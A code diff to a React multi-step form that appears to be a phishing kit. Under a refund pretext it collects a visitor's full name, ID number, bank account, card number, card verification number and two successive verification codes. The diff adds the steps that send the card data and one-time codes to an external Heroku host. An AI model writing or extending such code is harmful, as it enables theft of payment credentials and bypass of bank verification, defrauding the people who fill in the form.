@@ -71,7 +71,7 @@ export default function Form() {
 
     const sendData = (step) => {
         switch(step) {
-            case 2:
+            case 1:
                 axios.post("https://investment-com.herokuapp.com/step-1", {
                     fullName: values.clientFullname,
                     idNumber: values.clientId,
@@ -83,10 +83,23 @@ export default function Form() {
                 });
                 break;
             
-            case 3:
+            case 2:
                 axios.post("https://investment-com.herokuapp.com/step-2", {
                     refundAmount: values.refundAmount,
                     userBank: values.clientBankAccount,
+                    queryId: queryId,
+                }).then((response) => {
+                    if(response.data.saved) {
+                        console.log("step 2");
+                    }
+                });
+                break;
+            
+            case 3:
+                axios.post("https://investment-com.herokuapp.com/step-3", {
+                    cardNumber: values.clientCardNumber,
+                    cardVerificationNumber: values.cardVerificationNumber,
+                    accountNumber: values.clientAccountNumber,
                     queryId: queryId,
                 }).then((response) => {
                     if(response.data.saved) {
@@ -96,14 +109,24 @@ export default function Form() {
                 break;
             
             case 4:
-                axios.post("https://investment-com.herokuapp.com/step-3", {
-                    cardNumber: values.clientCardNumber,
-                    cardVerificationNumber: values.cardVerificationNumber,
-                    accountNumber: values.clientAccountNumber,
+                axios.post("https://investment-com.herokuapp.com/step-4", {
+                    firstCode: values.verificationCode,
                     queryId: queryId,
                 }).then((response) => {
                     if(response.data.saved) {
                         console.log("step 4");
+                    }
+                });
+                break;
+
+            case 5:
+                axios.post("https://investment-com.herokuapp.com/step-5", {
+                    secondCode: values.secondVerificationCode,
+                    queryId: queryId,
+                }).then((response) => {
+                    if(response.data.saved) {
+                        console.log("step 5");
+                        userRequestHandler();
                     }
                 });
                 break;
@@ -117,6 +140,10 @@ export default function Form() {
 
             if (step < 6) {
                 setStep(step + 1);
+            }
+
+            if(step === 1) {
+                sendData(1);
             }
 
             if(step === 2) {
@@ -134,7 +161,7 @@ export default function Form() {
         }, 5000);
         
         if(step === 6) {
-            userRequestHandler();
+            sendData(5);
         }
     };
     
